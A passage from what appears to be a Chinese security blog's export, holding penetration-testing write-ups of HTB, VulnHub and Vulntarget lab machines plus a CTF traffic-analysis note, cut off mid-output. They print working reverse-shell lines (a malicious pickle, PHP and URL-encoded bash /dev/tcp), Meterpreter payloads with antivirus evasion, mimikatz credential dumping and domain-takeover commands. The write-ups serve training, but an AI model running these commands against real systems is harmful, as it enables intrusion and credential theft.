HTB-BoardLight_Write-up1.前期准备 连接VPN。 靶场详情： 测试连通性： 连接正常！打靶启动！ 2.信息收集老样子，起手Nmap扫描： 1nmap -sSVC 10.10.11.11 出来两个端口，访问80端口是一个网页，没有什么内容，翻到底部发现有一个域名board.htb： 嗯，根据上一个靶场的经验，这个域名应该是关键，浅浅爆一下子域名： 1wfuzz -c -w /usr/share/wfuzz/wordlist/subdomains/subdomains-top1million-5000.txt -u &quot;http://board.htb&quot; -H &quot;Host: FUZZ.board.htb&quot; --hc 404 --hl 517 爆破出来一个crm.board.htb，先加到hosts文件，随后访问得到一个登陆页面： 可以发现框架是Dolibarr，版本是17.0.0，待会搜索一下一下有没有相关的框架漏洞，针对这个登陆框框再尝试一下弱密码能否登陆进去： 嗯，显然可以-.-，admin/admin就进来了，不过也没发现什么信息，去搜了一下相关的漏洞，发现该版本存在CVE-2023-30253漏洞，已经有现成的POC，该POC要求要知道账号密码，显然符合目前收集到的信息。 3.漏洞利用及提权下载好POC上传至Kali中： 根据实际参数设置一下反弹Shell回来的地址： 1python3 exploit.py http://crm.board.htb admin admin 10.10.16.35 44300 设置监听： 1rlwrap -cAr nc -lvvp 44300 成功弹回来了，用户是www-data，这是网站的权限，User的Flag显然不是这个用户，所以先进行一波信息收集，确定一下我们要获取的用户是哪一个： 1cat /etc/passwd | grep /bin/bash 查出来两个可登录的用户，显然对应靶场的两个Flag，不过下一步的思路就不太明确了，就跟着网友的Write_up做了，在/var/www/html/crm.board.htb/htdocs/conf/conf.php文件中找到了凭据： 密码是serverfun2$2023!!，这里猜测会有一个密码复用，尝试使用这个密码登录larissa，成功登录： 1ssh larissa@10.10.11.11 Flag就在家目录下： 低权限的Flag已经获取到了，接下来就是提权了，sudo -l没有什么信息，于是再去看看Write_up： 网友的笔记中用到了Linpeas这个工具，搜了一下，这是一个可以列举操作系统中所有可能的可提权项，不过去仓库找的时候貌似已经不提供下载了（仓库），可以自己创建，但是一时间没整明白，先去找了别人已经编译好的使用了，先把脚本上传至Kali，然后Python的Http服务对靶机提供下载： 去靶机获取： 赋予执行权限后运行： 12chmod u+x linpeas.sh./linpeas.sh 可能是我找的这个脚本的问题，我一时间无法定位到有效的提权点，果然能够定制自己的工具是一个很重要的能力啊…翻查Write_up发现是关注SUID有问题的文件： Google一下发现Enlightenment存在一个权限提升的漏洞CVE-2022-37706，已有设置好的POC： POC即开即用~老样子用Python开一个临时Http，将POC下载到靶机： 赋予执行权限并执行： 12chmod u+x CVE-2022-37706-LPE-exploit.sh./CVE-2022-37706-LPE-exploit.sh 提权成功，Flag在家目录下： 至此，所有Flag已获取，打靶完毕。 4.总结 这个靶场是Easy的难度，实际单从操作的情况来说也确实是属于简单的难度，一个提权工具和两个POC的运用，整体打下来的感觉还是缺乏思路，特别是提权前的思路不多，这里还需要多练。再深入一些的话，这里也还有几个可以提升的地方： 两个POC的原理还未明白透彻。 构建出一个自己的linpeas脚本。","tags":["靶场复现","Dolibarr"],"categories":["靶场复现","HTB"]},{"title":"HTB-Blurry_Write-up","path":"/2024/09/12/HTB-Blurry_Write-up/","content":"HTB-Blurry_Write-up (˵¯͒〰¯͒˵) HTB-Blurry_Write-up1.前期准备 靶场详情： 连接好HTB的VPN（具体连接方法不在此赘述）： 在Kali中测试与靶机的连通性： 连接正常！打靶启动！ 2.信息收集使用Nmap进行扫描： 1nmap -sSVC 10.10.11.19 开了80和22端口，给了个域名，进去发现是一个ClearML平台： 我们先暂时放在一边，后续整理，这时在看看子域名里面还有没有啥信息，使用wfuzz测试一下： 1wfuzz -c -w /usr/share/wfuzz/wordlist/subdomains/subdomains-top1million-5000.txt -u &quot;http://blurry.htb&quot; -H &quot;Host: FUZZ.blurry.htb&quot; --hc 404 --hl 7 爆出来四个子域名，先加进hosts文件先： 对于一个没见过的平台，我倾向于先去Google搜一下这平台都有啥漏洞，筛选完信息之后发现一篇⭐参考文章⭐；这平台漏洞还挺多： 结合了其他文章和上述参考文章，使用的漏洞是CVE-2024-24590，这个漏洞有POC可以直接打，这个漏洞总的来说是：攻击者可以创建包含任意代码的pickle文件，并将其作为工件通过API上传到项目中，当用户调用Artifact类中的get方法来下载文件并将其加载到内存中时，pickle文件将在他们的系统上被反序列化，运行其中包含的任意代码。 3.CVE-2024-24590利用无论是使用POC还是手动利用，我们都需要先获得服务器的认证，回到app的子域名，随便输入一个名字就可以进入工作台了： 我们需要将上述配置信息保存下来： 认证需要下载clearml库，然后使用clear-init命令进入控制台进行认证： 进入控制台后，将之前复制下来的配置粘贴进去即可认证成功： 这个时候，无论是使用POC利用，还是手工利用都具备条件了，我这里使用手工利用的方法，首先在本地新建一个py文件： 1234567891011121314151617import pickle, os # 导入 pickle 库用于对象序列化，os 库用于执行操作系统命令class RunCommand: def __reduce__(self): # 当尝试序列化 RunCommand 对象时，__reduce__ 方法定义了如何重建该对象。 # 这里指定使用 os.system 函数执行一个 bash 命令，该命令尝试建立一个反向 shell 连接到指定的 IP 和端口。 return (os.system, (&#x27;/bin/bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/10.10.16.27/44300 0&gt;&amp;1&quot;&#x27;,))command = RunCommand() # 创建 RunCommand 类的一个实例from clearml import Task # 从 clearml 库导入 Task 类，用于任务管理和跟踪task = Task.init(project_name=&#x27;Black Swan&#x27;, task_name=&#x27;pickle_artifact_upload&#x27;, tags=[&quot;review&quot;])# 初始化一个 ClearML 任务，指定项目名、任务名和标签。# 将 command 对象上传为一个 ClearML 任务的工件（artifact），这个对象被序列化为一个 .pkl 文件。# 设置重试次数为2次，等待上传完成。task.upload_artifact(name=&#x27;pickle_artifact&#x27;, artifact_object=command, retries=2, wait_on_upload=True, extension_name=&quot;.pkl&quot;) 开一个终端监听脚本中的44300端口： 执行上述脚本后，大概1分钟后能接收到反弹回来的Shell，可看到反弹回来了用户jippity的终端： User的Flag就在家目录下： 至此第一个Flag获得，下一步就是提权获取Root权限的Flag了。 4.劫持Python库提权获取到了普通用户的权限，先看看sudo -l的内容： 这里提示到了一个文件：evaluate_model，简单审查一下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#!/bin/bash# Evaluate a given model against our proprietary dataset.# Security checks against model file included.if [ &quot;$#&quot; -ne 1 ]; then /usr/bin/echo &quot;Usage: $0 &lt;path_to_model.pth&gt;&quot; exit 1fiMODEL_FILE=&quot;$1&quot;TEMP_DIR=&quot;/opt/temp&quot;PYTHON_SCRIPT=&quot;/models/evaluate_model.py&quot; /usr/bin/mkdir -p &quot;$TEMP_DIR&quot;file_type=$(/usr/bin/file --brief &quot;$MODEL_FILE&quot;)# Extract based on file typeif [[ &quot;$file_type&quot; == *&quot;POSIX tar archive&quot;* ]]; then # POSIX tar archive (older PyTorch format) /usr/bin/tar -xf &quot;$MODEL_FILE&quot; -C &quot;$TEMP_DIR&quot;elif [[ &quot;$file_type&quot; == *&quot;Zip archive data&quot;* ]]; then # Zip archive (newer PyTorch format) /usr/bin/unzip -q &quot;$MODEL_FILE&quot; -d &quot;$TEMP_DIR&quot;else /usr/bin/echo &quot;[!] Unknown or unsupported file format for $MODEL_FILE&quot; exit 2fi/usr/bin/find &quot;$TEMP_DIR&quot; -type f \\( -name &quot;*.pkl&quot; -o -name &quot;pickle&quot; \\) -print0 | while IFS= read -r -d $&#x27;\\0&#x27; extracted_pkl; do fickling_output=$(/usr/local/bin/fickling -s --json-output /dev/fd/1 &quot;$extracted_pkl&quot;) if /usr/bin/echo &quot;$fickling_output&quot; | /usr/bin/jq -e &#x27;select(.severity == &quot;OVERTLY_MALICIOUS&quot;)&#x27; &gt;/dev/null; then /usr/bin/echo &quot;[!] Model $MODEL_FILE contains OVERTLY_MALICIOUS components and will be deleted.&quot; /bin/rm &quot;$MODEL_FILE&quot; break fidone/usr/bin/find &quot;$TEMP_DIR&quot; -type f -exec /bin/rm &#123;&#125; +/bin/rm -rf &quot;$TEMP_DIR&quot;if [ -f &quot;$MODEL_FILE&quot; ]; then /usr/bin/echo &quot;[+] Model $MODEL_FILE is considered safe. Processing...&quot; /usr/bin/python3 &quot;$PYTHON_SCRIPT&quot; &quot;$MODEL_FILE&quot;fi 一个Shell脚本，提到了&#x2F;models&#x2F;evaluate_model.py这个文件，那我们进而审查这个py文件： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576import torchimport torch.nn as nnfrom torchvision import transformsfrom torchvision.datasets import CIFAR10from torch.utils.data import DataLoader, Subsetimport numpy as npimport sysclass CustomCNN(nn.Module): def __init__(self): super(CustomCNN, self).__init__() self.conv1 = nn.Conv2d(in_channels=3, out_channels=16, kernel_size=3, padding=1) self.conv2 = nn.Conv2d(in_channels=16, out_channels=32, kernel_size=3, padding=1) self.pool = nn.MaxPool2d(kernel_size=2, stride=2, padding=0) self.fc1 = nn.Linear(in_features=32 * 8 * 8, out_features=128) self.fc2 = nn.Linear(in_features=128, out_features=10) self.relu = nn.ReLU() def forward(self, x): x = self.pool(self.relu(self.conv1(x))) x = self.pool(self.relu(self.conv2(x))) x = x.view(-1, 32 * 8 * 8) x = self.relu(self.fc1(x)) x = self.fc2(x) return xdef load_model(model_path): model = CustomCNN() state_dict = torch.load(model_path) model.load_state_dict(state_dict) model.eval() return modeldef prepare_dataloader(batch_size=32): transform = transforms.Compose([ transforms.RandomHorizontalFlip(), transforms.RandomCrop(32, padding=4), transforms.ToTensor(), transforms.Normalize(mean=[0.4914, 0.4822, 0.4465], std=[0.2023, 0.1994, 0.2010]), ]) dataset = CIFAR10(root=&#x27;/root/datasets/&#x27;, train=False, download=False, transform=transform) subset = Subset(dataset, indices=np.random.choice(len(dataset), 64, replace=False)) dataloader = DataLoader(subset, batch_size=batch_size, shuffle=False) return dataloaderdef evaluate_model(model, dataloader): correct = 0 total = 0 with torch.no_grad(): for images, labels in dataloader: outputs = model(images) _, predicted = torch.max(outputs.data, 1) total += labels.size(0) correct += (predicted == labels).sum().item() accuracy = 100 * correct / total print(f&#x27;[+] Accuracy of the model on the test dataset: &#123;accuracy:.2f&#125;%&#x27;)def main(model_path): model = load_model(model_path) print(&quot;[+] Loaded Model.&quot;) dataloader = prepare_dataloader() print(&quot;[+] Dataloader ready. Evaluating model...&quot;) evaluate_model(model, dataloader)if __name__ == &quot;__main__&quot;: if len(sys.argv) &lt; 2: print(&quot;Usage: python script.py &lt;path_to_model.pth&gt;&quot;) else: model_path = sys.argv[1] # Path to the .pth file main(model_path) 这个脚本定义了一个自定义的卷积神经网络（CNN）模型，并使用 CIFAR-10 数据集对其进行评估，可以用于验证特定模型在处理小图像数据集时的性能。嗯，这些不重要，重点在于： ①：这个脚本引入了torch库； ②：使用这个脚本需要两个参数。 再看看前面的models文件夹有什么信息： 可以看到models文件夹我们有写入文件，models文件夹内有一个evaluate_model.py和demo_model.pth，再结合之前那个脚本的运行方式，这个结构符合运行的条件。evaluate_model.py文件引入了torch库，根据Python的特性，项目文件会优先导入本地的库，又正巧models的文件夹我们有写入权限，那我们就可以伪造一个torch.py文件来进行提权： 12echo &#x27;import os; os.system(&quot;bash&quot;)&#x27; &gt; /models/torch.pysudo /usr/bin/evaluate_model /models/demo_model.pth 可见已经获得了root权限，在家目录下读取Flag即可。 至此，打靶结束。 5.总结 总体来说这个靶场的难度不算高，主要是考察了ClearML平台的漏洞和劫持Python库相关的内容，有难度的点是在ClearML平台漏洞复现这一块，国内的资料几乎没有，国外的资料也不怎么详细，想要弄明白整个运行机制还是需要一定的代码审计能力。对于这个靶场对我自己来说其实还存在待解决的问题： 反弹Shell那一部分为什么能反弹回来？整一个运行机制还不是特别的清楚。","tags":["靶场复现","ClearML"],"categories":["靶场复现","HTB"]},{"title":"VulnHub-SickOS1.1_Write-up","path":"/2024/04/29/VulnHub-SickOS1.1-Write-up/","content":"VulnHub系列靶场-SickOS1.1复现流程 ( •̀ ω •́ )✧ VulnHub-SickOS1.1_Write-up1.环境部署 靶机来源：靶机详情页 安装说明： 下载下来解压获得ovf后缀文件，在”VMware -&gt; 文件 -&gt; 打开“中打开ovf文件即可部署成功。 由于靶机详情页未说明该靶机的具体信息，考虑到接入现有公共网络中进行扫描存在信息混杂的情况，可以在”虚拟机 -&gt; 设置 -&gt; 网络适配器 -&gt; 高级 -&gt; MAC地址“中记录MAC地址，以便在后续打靶中更好的找到该靶机。 2.信息收集老样子使用Kali进行信息收集，依旧是使用arp协议定位靶机： 1arp-scan -l 使用Nmap扫描一遍： 1nmap -sV -O 192.168.2.21 可以看到开放了ssh，还有一个3128端口，暂时不清楚是什么东西，看起来像个代理服务，8080端口关闭了；使用靶机IP:8080显示拒绝连接： 突破口应该是在这个3128上，既然是代理，那就尝试用这个代理访问试试，注意结合上面的扫描信息，协议用的是Http： 果然成啦： 不过就只是一个简陋的页面，也看不出来有啥可操作的，于是回到Kali扫描一下目录： 12dirb http://192.168.2.21 -p http://192.168.2.21:3128# dirb是一个基于字典的web目录扫描工具 还是有东西的，还有robots.txt，这必须访问一下： 得到一个cms的信息，没听过，搜一下啥玩意： 看来是个内容管理系统，再搜一搜相关的漏洞，貌似都是后台文件上传的漏洞，那看来要先找到这个cms的后台，robots.txt文件提到了有&#x2F;wolfcms这个目录，我选择访问一下： 3.WEB渗透但是看起来是前台页面，于是搜一下这玩意的后台路径是啥，基本可以确认是&#x2F;wolfcms&#x2F;?&#x2F;admin： 这里使用弱口令admin\\admin直接就进去了： 对于此处的操作有一些思考： ​\t关于这些后台的账号密码攻破阶段，基本上都是弱密码进入，或者是后台的初始密码进入，进是进去了，但是总感觉是碰运气的；在实际渗透的过程中似乎也没有什么很好的方法，要么就是找敏感信息泄露、要么就是弱口令爆破，要么是初始默认密码，一般此类问题有这三个思路。 其中的Articles有可以写PHP代码的地方，Files栏目中有可以上传文件的地方，这两个地方应该都是可以操作的： 尝试在Articles中插入反弹Shell的代码试试，现在Kali中开个监听： 1nc -lvnp 3333 1&lt;?php exec(&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.2.20/3333 0&gt;&amp;1&#x27;&quot;); ?&gt; 保存成功，不过Kali这边还没反应，应该是还没解析，可以点旁边的放大镜解析： 点击后Kali就拿到了www的权限了： 查看一下权限： 1sudo -l 4.提权权限很低，从其他地方收集一下信息： 当前目录的文件权限倒是都很高，看来有操作的空间；其中在config.php中发现了一下信息： 找到了数据库的用户名和密码：root&#x2F;john@123 再看看有几个可登录的用户： 还挺多，不过看到了一个和靶机同名的用户sickos，尝试刚刚的密码能不能登录： sickos成功登录，可惜root用户不是这个密码@-@；照例看看权限： 好嘛，看起来是个十分健壮的用户呢，我直接root！启动！ 到处找找，拿到Flag： 至此，打靶结束！~","tags":["靶场复现"],"categories":["靶场复现"]},{"title":"VulnHub-DarkHole-2_Write-up","path":"/2024/04/26/VulnHub-DarkHole_2-Write-up/","content":"VulnHub系列靶场-DarkHole_2复现流程 (●’◡’●) VulnHub-DarkHole_2-Write-up1.环境部署 靶机来源：靶机详情页 安装说明： 下载下来解压获得ovf后缀文件，在”VMware -&gt; 文件 -&gt; 打开“中打开ovf文件即可部署成功。 由于靶机详情页未说明该靶机的具体信息，考虑到接入现有公共网络中进行扫描存在信息混杂的情况，可以在”虚拟机 -&gt; 设置 -&gt; 网络适配器 -&gt; 高级 -&gt; MAC地址“中记录MAC地址，以便在后续打靶中更好的找到该靶机。 2.信息收集使用Kali进行信息收集，利用arp协议在众多主机中定位到靶机： 1arp-scan -l 使用Nmap进行扫描： 1nmap -sV -O 192.168.2.26 看到开了80端口，浏览器访问看看，发现一个简单的网页： 点击Login发现是通过邮箱登录，不太像是可以爆破的情景： 那就使用dirsearch进行目录扫描，看看还有没有其他什么信息： 1dirsearch -u &quot;192.168.2.26:80&quot; 发现存在.git目录，猜测存在git信息泄露漏洞。 3.开始渗透先尝试访问.git路径： 发现确实是有东西的，那么二话不说使用git-dumper把东西先弄下来： 1git-dumper http://192.168.2.26/.git/ gitbackup 进入gitbackup文件夹查看提交日志： 12cd gitbackupgit log 挨个查看提交和本地索引的差距： 123git diff 0f1d821f48a9cf662f285457a5ce9af6b9feb2c4git diff a4d900a8d85e8938d3601f3cef113ee293028e10git diff aa2a5f3aa15bb402f2b90a07d86af57436d64917 第一个没东西，第二个发现存在账号密码： 第三个是login.php的信息： 使用刚刚发现的账号密码登录： 注意到地址栏的?id&#x3D;1，猜测存在Sql注入，使用?id&#x3D;1’测试一下发现页面空白，确实存在Sql注入： 直接使用Sql带cookie进行爆破： 1sqlmap -u &quot;http://192.168.2.26/dashboard.php?id=1&quot; --cookie PHPSESSID=di32sln9p2u0jpe1l945ql44ig --current-db 获取cookie： 爆出数据库： 爆表，有两个表，ssh和user： 1sqlmap -u &quot;http://192.168.2.26/dashboard.php?id=1&quot; --cookie PHPSESSID=di32sln9p2u0jpe1l945ql44ig -D darkhole_2 --tables 分别爆出这两个表的详细信息： 1sqlmap -u &quot;http://192.168.2.26/dashboard.php?id=1&quot; --cookie PHPSESSID=di32sln9p2u0jpe1l945ql44ig -D darkhole_2 -T users -dump 1sqlmap -u &quot;http://192.168.2.26/dashboard.php?id=1&quot; --cookie PHPSESSID=di32sln9p2u0jpe1l945ql44ig -D darkhole_2 -T ssh -dump 至此，得到了ssh的用户名和密码，以及登录网页的用户名、邮箱和密码。结合之前的信息收集，开放了22端口，可以连接ssh了： 4.提权登录到系统后，查看一下当前的权限： 发现我们只是一个低权限，那下一步或许是提权了，先对目前的系统做一个简单的信息收集： 1history 查看一下历史命令，发现本地有9999的服务，并且有计划任务： 查看一下计划任务，发现是losy执行的，那看来下一步的思路应该在losy这个用户上： 1cat /etc/crontab 再看看&#x2F;opt&#x2F;web里是个什么文件： 12cd /opt/webcat index.php 发现是一个命令执行的脚本，尝试在本地执行一下： 发现返回回来的信息是losy的，结合前面的信息，该脚本是用losy的身份来执行的，可以结合之前在历史命令中发现的密码，执行查看历史命令的操作： 1jehad@darkhole:/opt/web$ curl &quot;http://127.0.0.1:9999/?cmd=cat+~/.bash_history&quot; 就可以发现losy的密码：gang；至此可以登录losy： 照例查看一下权限： 1sudo -l 发现拥有以root权限执行python3的权限： 那思路就很清晰了：利用Python中的系统函数打开一个shell，然后该脚本使用sudo执行，那么打开的shell自然也是root的了： 1sudo python3 -c &#x27;import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)&#x27; 至此，拿到靶机的最高权限，看看有没有flag的踪影： 至此，靶机通关！ 5.一些关于反弹Shell的补充说明 在参考网友的打靶攻略时，发现还有反弹Shell的操作，开始跟着复现的时候没有成功，最后发现似乎不需要这一步骤也可以获取到losy的密码，毕竟在jehad用户上利用命令执行即可收集到所需信息，但在此还是复现一次反弹Shell的操作，以作记录。 反弹Shell前用到一条命令： 123ssh jehad@192.168.184.156 -L 9999:localhost:9999# -L 选项用法如下：# -L portX:hostC:portZ 或 -L *:portX:hostC:portZ 表示从任意主机发往主机 A 的端口 X 的流量，都通过主机 B，发往主机 C 的端口 Z。 结合这张图来理解： 其中SSH Client为Kali，SSH Server为靶机，结合命令来解释即是：从任意主机（当然也包括自己）发往主机A（也就是Kali）的端口9999的流量都会通过主机B（也就是靶机），发往主机C（也就是上文的localhost）；然后又因为流量都是通过主机B（靶机）发送出去的，也就是说这个”localhost“是以主机B的身份访问的，回包亦然；经过如此操作，那么就可以在Kali上访问自己的9000端口来收到收到命令执行的信息。 执行以上命令后，再开一个窗口监听反弹shell的端口，然后再开一个窗口对自身的9000端口进行访问，即使用反弹Shell的语句： 反弹shell的语句需要经过url编码一下：Url转换小工具 123http://127.0.0.1:9999/?cmd=bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.2.20/9001 0&gt;&amp;1&quot;http://127.0.0.1:9999/?cmd=bash+-c+%22bash+-i+%3e%26+%2fdev%2ftcp%2f192.168.2.20%2f9001+0%3e%261%22 拿到Shell后继续正常渗透步骤即可： 本文结束~","tags":["靶场复现"],"categories":["靶场复现"]},{"title":"Vulntarget-B_Write-up","path":"/2024/04/24/Vulntarget-B-Write-up/","content":"Vulntarget系列靶场~第二关 ╰(°▽°)╯ Vulntarget-B综合靶场通关记录靶场环境如图： 1.获取外网CentOS7权限1.1 信息收集对目标主机进行全面扫描 12┌──(root㉿kali)-[~]└─# nmap -sV 192.168.1.22 可以发现目标系统为Linux，并且开放了几个Web服务，先挨个访问进行一波简单的信息收集，最后发现81端口上为极致cms的建站系统： 网上搜索一下有关这个cms的漏洞，发现后面跟admin.php可以跳转到后台登录中： 简单尝试一下弱口令，发现admin\\admin123可以直接登录： 1.2 GetShell网上搜索发现极致cms有一个后台getshell的漏洞，原理是通过系统自带的插件市场下载在线编辑插件，在页面中插入一句话木马，从而getshell： 安装好，点击配置，弹出一个账户密码配置，账户可以随便填： 登录之后发现可以直接看到网站的文件，也可以修改，我们直接在index.php中插入一句话木马： 随后用蚁剑连接即可： 进到后台打开终端收集信息，发现终端显示ret&#x3D;127： 此处用蚁剑插件绕过即可： 点击开始后，终端可用： 进行信息收集，发现由此方法进入的终端命令执行不太正常，只能带路径启动命令： 可以发现存在另外一个IP地址：10.0.20.30；那下一步的思路就很明确了，利用msf上线该主机，提权、加路由、探测内网下一跳地址。 1.3 MSF上线首先先生成一个msf的反向马，利用蚁剑传上去： 1msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.2.8 LPORT=4444 -f elf &gt; 4444.elf 进入msf进行监听： 123456msfconsoleuse exploit/multi/handlerset payload linux/x64/meterpreter/reverse_tcpset lhost 192.168.2.8set lport 4444run 蚁剑启动反向马： 目前还是低权限，接下来是提权，先添加路由： 1meterpreter &gt; run post/multi/manage/autoroute 1.4 CentOS7提权+内网信息收集搜索一波目标系统利用的洞： 1meterpreter &gt; run post/multi/recon/local_exploit_suggester 还不少可以用的，这里我们用第一个，先把当前会话放至后台： 1234567meterpreter &gt; bg[*] Backgrounding session 1...msf6 exploit(multi/handler) &gt; use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcpmsf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) &gt; set session 1session =&gt; 1msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) &gt; run 直接拿到root权限，更改root密码，ssh上去获取flag： 接着回到msf中，将刚刚拿到root权限的会话放至后台，开始探测内网： 1use auxiliary/scanner/portscan/tcp 扫描常用端口，发现存活10.0.20.66主机： 1.5构造MSF代理以之前拿下的Linux系统做跳板，构建代理，进而访问内网的web服务： 1use auxiliary/server/socks_proxy 2.获取Win10权限2.1 信息收集+GetShell 发现是禅道OA，尝试之前的弱密码，发现只是密码的a变成了A，直接弱密码登陆后台admin&#x2F;Admin123： 确认版本为12.4.2，搜索相关可用漏洞，发现存在CNVD-C-2020-121325的任意文件上传漏洞： 禅道OA 12.4.2 中，因为download中的downloadZipPackage函数过滤不严谨，可以使用ftp，HTTP协议绕过。 POC1：http:&#x2F;&#x2F;[目标地址]&#x2F;www&#x2F;client-download-[$version参数]-[base64加密后的恶意文件地址].html POC2：http:&#x2F;&#x2F; [目标地址] &#x2F;www&#x2F;index.php?m&#x3D;client&amp;f&#x3D;download&amp;version&#x3D;[$version参数]&amp;link&#x3D;[ base64加密后的恶意文件地址] 在之前的拿下root权限的机器中创建一个PHP木马： 目标机器有Python环境，那么我们利用这个启动一个简单的Http服务： 1[root@localhost ~]# python -m SimpleHTTPServer 8963 那么木马的链接则为： 1234HTTP://10.0.20.30:8963/shell.php# 注意：HTTP必须为大写# 通过Base64编码SFRUUDovLzEwLjAuMjAuMzA6ODk2My9zaGVsbC5waHA= 那么我们就可以构造链接了： 1http://10.0.20.66:8080/index.php?m=client&amp;f=download&amp;version=1&amp;link=SFRUUDovLzEwLjAuMjAuMzA6ODk2My9zaGVsbC5waHA= 可以看到保存成功的字样： 由漏洞详情可知道上传的shell的地址在：http://xxx.xxx.xxx.xxx/zentao/data/client/1/xxx.php 访问对应的地址，木马成功解析，接下来使用蚁剑挂代理进行连接： 识别到火绒： 2.2 免杀火绒既然有杀软那就要对上线的木马做免杀处理了，该靶场是2021年搭建的，火绒也是2021年的版本，我们随意找一个2022年的免杀工具对木马进行免杀即可，本文使用GoBypassAV，首先生成payload： 1msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.0.20.30 lport=9999 -f raw -o winre9999.bin 随后进行免杀处理： 2.3 Win10-MSF上线更改名字后上传蚁剑： 回到msf打开监听： 12345use exploit/multi/handlerset payload windows/x64/meterpreter/reverse_tcpset lhost 10.0.20.30set lport 9999run 成功上线，火绒并没有把木马干掉： 拿到的是低权限，先添加路由，发现另一个网段： 1meterpreter &gt; run post/multi/manage/autoroute 2.4 Win10-提权老样子，使用msf自带的搜寻模块看看有啥洞： 1meterpreter &gt; run post/multi/recon/local_exploit_suggester 小东西问题还挺多~ 网上搜索一下各漏洞详情，决定采用cve_2020_0796_smbghost，先把会话移至后台，随后设置好攻击参数，提权成功： 1use exploit/windows/local/cve_2020_0796_smbghost 2.5 密码提取尝试获取密码，加载kiwi，没有什么有用的信息，但是看到存在域： 12load kiwicreds_all 需要获取域成员的密码，利用注册表和 procdump + mimikatz 来获取密码： 12# 修改注册表reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f 修改后需要用户重新登录才生效 使用蚁剑上传procdump： 回到msf利用高权限运行procdump下载lsass文件： 1C:\\Windows\\system32&gt;C:\\inetpub\\zentao\\zentaopms\\www\\data\\client\\1\\procdump64.exe -accepteula -ma lsass.exe lsass.dmp 下载到本地： 读取密码： 1mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit 至此，域成员的密码获取成功：admin#123 3.获取域控权限3.1 票据获取+PsExec横向移动（失败）回到msf后收集域控的信息： 上传noPac工具： 1meterpreter &gt; upload /home/kali/noPac.exe 随后进shell中获取票据： 1noPac.exe -domain vulntarget.com -user win101 -pass admin#123 /dc WIN-UH20PRD3EAO.vulntarget.com /mAccount test2 /mPassword admin@123 /service cifs /ptt 列出域控目录： 添加域管账号： 12net user admin11 123K@!E /add /domainnet group &quot;Domain Admins&quot; admin11 /add /domain 修改防火墙策略并开启Win10的远程： 1234# 开放端口netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow# 开启远程REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f 上传PsExec进行连接(失败)： 3.2 sam-the-admin拿下域控权限（成功）于是换一种方法，使用Python脚本挂proxychains代理执行拿到了域控System权限： 1proxychains python sam_the_admin.py &quot;vulntarget.com/win101:admin#123&quot; -dc-ip 10.0.10.100 -shell 虽然乱码，但是确实是域控权限： 域控的管理员目录下有一枚flag： 补充前面，域成员的管理员目录也有一个flag： 至此，Vulntarget-b靶场三台资产的最高权限均以拿到，文章结束~","tags":["靶场复现"],"categories":["靶场复现"]},{"title":"CTF赛题笔记","path":"/2024/03/28/CTF赛题笔记/","content":"MISC流量分析NKCTF2024-Webshell_pro下载获取附件，解压得到一个数据包文件： 使用Wireshark打开查看，使用协议类型排序会发现响应包有内容： 随机抽一段解码发现为Base32编码： 猜测每一个响应包均有类似内容，且由题目可联想到应该是由响应包返回所需内容；于是采用脚本批量提取响应包并解码组合： 1234567891011from FlowAnalyzer import FlowAnalyzer# 一个用于流量分析的第三方库，具体用法：https://github.com/Byxs20/FlowAnalyzerimport base64# 以http为过滤规则读取数据包jsonPath = FlowAnalyzer.get_json_data(&quot;/tmp/webshell_pro.pcapng&quot;, display_filter = &quot;http&quot;)# 从HTTP请求和响应信息的字典对中遍历请求与相应，若有响应，则使用Base32解码并打印for request, response in FlowAnalyzer(jsonPath).generate_http_dict_pairs(): if response: print(base64.b32decode(response.file_data).decode()) 运行得出以下内容： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121┌──(kali㉿kali)-[~/桌面]└─$ python3 ctf.py root/bin/sh: 1: ipconfig: not foundeth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1460 inet 172.22.161.159 netmask 255.255.240.0 broadcast 172.22.175.255 inet6 fe80::215:5dff:fe18:b845 prefixlen 64 scopeid 0x20&lt;link&gt; ether 00:15:5d:18:b8:45 txqueuelen 1000 (Ethernet) RX packets 26778 bytes 10199358 (10.1 MB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 1240 bytes 175322 (175.3 KB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt; mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 inet6 ::1 prefixlen 128 scopeid 0x10&lt;host&gt; loop txqueuelen 1000 (Local Loopback) RX packets 0 bytes 0 (0.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 0 bytes 0 (0.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0Dockerbinbootdevetchomeinitliblib32lib64libx32lost+foundmediamntmysql_dataoptprocrootrunsbinsnapsrvsystmpusrvarwslOHicoGwslbmJCJFwslgCJNfEwslhaGDbDCompressedDesktopDocumentsDownloadsFLAGMusicPicturesPublicTemplatesVideosWSLhint.py小明的日记.txtcat: 小明的日记.txt: No such file or 